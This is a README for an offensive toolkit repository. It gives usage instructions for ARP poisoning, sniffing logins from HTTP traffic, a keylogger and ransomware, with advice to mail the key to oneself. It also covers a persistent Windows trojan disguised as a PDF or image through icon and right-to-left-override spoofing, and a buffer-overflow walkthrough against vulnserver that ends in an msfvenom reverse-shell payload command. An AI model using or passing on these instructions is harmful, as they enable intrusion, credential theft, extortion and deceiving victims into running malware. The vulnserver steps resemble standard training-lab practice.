# Cyber_Security_Tools
```
> 1 - Manual Mac Changer:
  >> usage = python3 <script> -m <MAC> -i <INTERFACE>
  
  
> 2 - Network Scanner:
  >> usage = python3 <script> -i <INTERFACE> -r <RANGE> -t <TIMEOUT>
  >> with default values = python3 <script> -r <RANGE>
  
  
> 3 - Arp Poisoning:
  >> usage = python3 <script> -i <INTERFACE> -t <TARGET IP>
  >> with default values = python3 <script> -t <TARGET IP>
  
  
> 4 - Network Listener:
  After arp-spoof attack run this code to get HTTP sites visited and Login (username, password)
  If you want to use it with https you have to downgrade HTTPs with sslstrip and dns2proxy
  >> usage = python3 <script> -i <INTERFACE>
  
  
> 5 - Keylogger:
  It is simple keylogger works for your own PC but it can be improved (maybe combined with socket)
  >> usage = python3 <script>
  
  
> 6 - Ransomware:
  The script Encrypt every files with Fernet instead of generated Key and Folders and save new Key as generated Key
  It can be improved with not saving Key and mailing Key to yourself with smtpclient 
  >> usage = python3 <script> 
     1 - decryption
     2 - encryption
    
    
 > 7 - Backdoor and Listener:
  > 7.1 - Backdoor(Trojan): 
    OPEN script and change ip and port as you wish 
      If you want to use it against windows and create backdoor everytime machine opened uncomment add_to_regedit()
      If you want to open .exe file with .pdf or .jpg file uncomment open_data()
      
      run pyinstaller to create .exe file:
        pyinstaller <script> --onefile -w 
      if you want to add (.png or ... file) and want to have different icon for exe:
        pyinstaller <script> --onefile -w --add-data "<.pdf or .png ... file path>;." --icon <.ico path>
      After generating exe you can spoof extension with right-to-left overriding.
      
      To create .exe file for windows:
        Install wine and install python3 and pyinstaller with wine
        then go inside python folder and run:
          wine python.exe Scripts/pyinstaller.exe <script> --onefile -w --add-data "<.pdf or .png ... file path>;." --icon <.ico path>
          
 
    > 7.2 - Listener:
      >> usage = python3 <script>
        port = <listen_port>
        COMMANDS:
          upload <file_in_current_folder>  TO UPLOAD
          download <file_at_target>        TO DOWNLOAD
          read <file_at_target>            TO READ FILE
          remove <file_at_target>          TO REMOVE FILE
          cd <directory_at_target/..>      TO CHANGE DIRECTORY
          exit                             TO CLOSE SESSION
          
          AND MAIN COMMANDS for WINDOWS or LINUX such as (dir or ls)
        


  > 8 - BufferOverFlow:
    This script is tested with vulnserver. Install vulnserver and Immunity Debugger
    
    1st) Run server and debugger on windows and from linux check if there are any overflow:
      ##Change s_string with testing command inside .spk
      generic_send_tcp <sv_ip> <sv_port> <spike_script> 0 0
      
      ##Note that command
      
    2nd) Create pattern and find exact flow offset:
      ##locate patternt_create.rb
      ./pattern_create.rb -l <length>
      
      then change fuzzing.py pattern with your pattern to server and blow server again.
      After blowing check EIP value then run:
         ./pattern_offset.rb -l <length> -q <EIP value>
      This command will give you the exact overflow offset.
      
    3rd) Check if there are any bad characthers:
      Run badChar.py and after blowing check Immunity Debugger
      right click ESP choose follow in dump
      and from 01 to ff check if there is any hop (example = 01 02 03 05... \x04 is bad char)
      and know that \x00 is bad char for all cases.
      
    4th) Eventually download mona.py to ImmunityDebugger/PyCommands
      Run server and debuuger.
      JMP ESP command has to be written and its HEX value is FFE4
      
      From Debugger run:
        !mona modules
        !mona find -s "\xff\xe4" -m <non-safe module (such as essfunc.dll)> 
      THEN copy the result value such as(625011af)
      
      Create backdoor with msfvenom:
        msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread/process -f c -a x86 -b <bad_chars(such as "\x00")>
      copy HEX value
      
      change HEX value with Exploit.py rev_shell value. Then first run listener like netcat to listen given port and finally run Exploit.py
      REVERSE_SHELL connection has to be succesfully done.
```
      
